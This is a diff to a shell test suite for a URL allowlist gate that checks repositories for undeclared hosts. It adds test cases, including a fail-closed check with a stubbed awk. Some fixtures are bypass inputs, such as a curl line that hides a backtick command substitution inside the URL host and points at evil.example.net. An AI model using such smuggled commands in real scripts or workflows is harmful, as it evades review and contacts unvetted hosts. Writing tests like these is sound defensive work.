@@ -572,16 +572,31 @@ check "a declared host survives a space inside an expression" allow "$sample_dir
 check "a declared host in a template literal is not an expression" allow "$sample_dir/w9.ts" \
   'const u = `https://user-api.erpc.global`;'
 
-# A KNOWN LIMIT, and the one shape this gate does not see. The match ends
-# at the space, so the host is `\x60cat` and the domain after the space is out
-# of reach. Reporting it would need the backtick rule to fire on a tail with
-# no dot in it, and that same widening rejects `\x60https://semver.org\x60.` and
-# `\x60https://user-api.erpc.global\x60.length`, which are correct lines using
-# declared hosts. The narrow rule plus a stated limit beats a wide rule that
-# makes the gate wrong about documentation. If a future change makes this
-# block, update this case rather than deleting it.
-check "KNOWN LIMIT: backtick expression with a space is not seen" allow "$sample_dir/w10.sh" \
-  'curl https://\x60cat host\x60.evil.example.net/x'
+# NO LONGER A LIMIT, and the last silent pass in check_occurrence. This was
+# `allow` while the authority ended at the space inside the backtick
+# expression, leaving `\x60cat` -- whose mid-punctuation prefix is EMPTY, so
+# the function fell through to the non-empty test and RETURNED SUCCESS with
+# the real domain after the space still unexamined. In a workflow `run:`
+# step the backtick is a command substitution and that domain is contacted.
+#
+# The fix is not to widen the backtick rule, which is what the old comment
+# here ruled out and was right to: pairing backticks across a space would
+# swallow `\x60https://semver.org\x60.` and
+# `\x60https://user-api.erpc.global\x60.trim()` to end of line, both correct
+# lines. It is to report when the prefix is empty, because an authority that
+# begins with punctuation has no literal part to judge -- so the honest
+# answer is neither to resolve it nor to skip it.
+#
+# check_msg writes its fixture with %s, not %b, so the backticks here are
+# literal rather than \x60 escapes. A `check` case next to this one may
+# still use the escapes; the two helpers differ in that one respect.
+#
+# The report names `cat` rather than the domain, which is all the gate can
+# honestly say: the domain is past a terminator and was never part of this
+# authority.
+check_msg "a backtick expression with a space is reported" "$sample_dir/w10.sh" \
+  'curl https://`cat host`.evil.example.net/x' \
+  'the authority begins with punctuation'
 
 # The two directions the predicate has to separate, both new here.
 check "a backtick followed by another domain is reported" block "$sample_dir/w11.ts" \
@@ -762,6 +777,40 @@ check "a typescript binding ending in a scheme" allow "$sample_dir/n6.ts" \
 check "a shell string whose word ends in a scheme" allow "$sample_dir/n7.sh" \
   'echo "shows:$x"'
 
+# ONE CASE PER ENTRY in the two character lists the gate's own header offers
+# as the bounded cost of the default-report design. That claim was checked by
+# dropping entries one at a time, and most of them had no case: the lists
+# were doing real work on inputs nothing exercised, so a future refactor
+# could have dropped an entry and produced false positives that are loud to
+# users and silent to CI. These are the correct lines each entry keeps
+# working. Every one of them is `allow`.
+#
+# authority_end / TERM -- where an authority stops.
+check "a query string ends the authority" allow "$sample_dir/t1.md" \
+  'See https://erpc.global?region=ams for it.'
+
+check "a fragment ends the authority" allow "$sample_dir/t2.md" \
+  'See https://semver.org#spec for the grammar.'
+
+check "a single quote ends the authority" allow "$sample_dir/t3.ts" \
+  "let u = 'https://erpc.global';"
+
+check "an angle bracket ends the authority" allow "$sample_dir/t4b.md" \
+  'Autolink: <https://semver.org> in markdown.'
+
+check "an opening angle bracket after a host" allow "$sample_dir/t5.md" \
+  'See https://erpc.global<br> here.'
+
+# authority_tail_punct -- what is stripped from the end.
+check "a closing bracket is stripped from the end" allow "$sample_dir/t6.toml" \
+  'urls = [https://erpc.global]'
+
+check "an exclamation mark is stripped from the end" allow "$sample_dir/t7.md" \
+  'Use https://erpc.global!'
+
+check "a closing brace is stripped from the end" allow "$sample_dir/t8.yml" \
+  'opts: {url: https://erpc.global}'
+
 # --- the invariant ------------------------------------------------------
 #
 # Every shape-specific case above pins one bypass. This pins the property
@@ -893,6 +942,57 @@ invariant "a digit between a comma and the next scheme" \
 invariant "two plain URLs on one line are both named" \
   'const a = "https://one.evil.example.net/1"; const b = "https://two.evil.example.net/2";' \
   one.evil.example.net two.evil.example.net
+
+# --- the gate must fail CLOSED ---------------------------------------------
+#
+# The scan runs in a process substitution, so neither pipefail nor an exit
+# status reaches the gate's own status variable. An awk that cannot start
+# therefore produced zero records: no findings, exit 0, every URL in the tree
+# allowed. That is the one failure mode where a gate must not be quiet, and
+# it is not hypothetical -- this scanner's first draft named a variable
+# `close`, which awk reserves, and the gate passed everything while saying
+# nothing.
+#
+# This runs the gate with an `awk` on PATH that fails, and asserts it refuses
+# rather than reporting a clean result. Asserted on the MESSAGE as well as
+# the code, because exit 2 is also what a missing allowlist produces.
+awk_stub_dir="$repo_root/$sample_dir/stub-bin"
+mkdir -p "$awk_stub_dir"
+# The stub fails ONLY for the scanner program, and defers to the real awk
+# otherwise. A stub that failed for everything would be caught earlier by
+# the allowlist tripwire -- which is worth knowing: a wholly broken awk was
+# never the exposure. The exposure is an awk that runs the simple programs
+# in this file and chokes on the scanner, which is exactly what a reserved
+# word in the scanner produces.
+{
+  printf '#!/bin/sh\n'
+  printf 'for a in "$@"; do\n'
+  printf '  case "$a" in *authority_of*) exit 1;; esac\n'
+  printf 'done\n'
+  printf 'exec /usr/bin/awk "$@"\n'
+} > "$awk_stub_dir/awk"
+chmod +x "$awk_stub_dir/awk"
+fc_rel="$sample_dir/failclosed.rs"
+printf '%s\n' 'let u = "https://evil.example.net/x";' > "$repo_root/$fc_rel"
+fc_out="$(PATH="$awk_stub_dir:$PATH" "$sh" "$gate" "$fc_rel" 2>&1)"; fc_rc=$?
+rm -rf "$awk_stub_dir" "$repo_root/$fc_rel"
+rmdir -p "$(dirname "$repo_root/$fc_rel")" 2>/dev/null || true
+case "$fc_rc:$fc_out" in
+  *"fewer than 5 hosts"*)
+    # The stub is not discriminating on this machine, so the case would pass
+    # for the wrong reason. Say so rather than counting it.
+    fail=$((fail + 1))
+    printf 'FAIL a scanner that cannot run makes the gate refuse (the stub broke the allowlist too; test is not measuring the scanner)\n';;
+  0:*)
+    fail=$((fail + 1))
+    printf 'FAIL a scanner that cannot run makes the gate refuse (exit 0: it passed a known-bad URL)\n';;
+  *"did not run to completion"*)
+    pass=$((pass + 1))
+    printf 'ok   a scanner that cannot run makes the gate refuse\n';;
+  *)
+    fail=$((fail + 1))
+    printf 'FAIL a scanner that cannot run makes the gate refuse (exit %s, said: %s)\n' "$fc_rc" "$fc_out";;
+esac
 
 printf '\n%s passed, %s failed\n' "$pass" "$fail"
 [ "$fail" -eq 0 ]
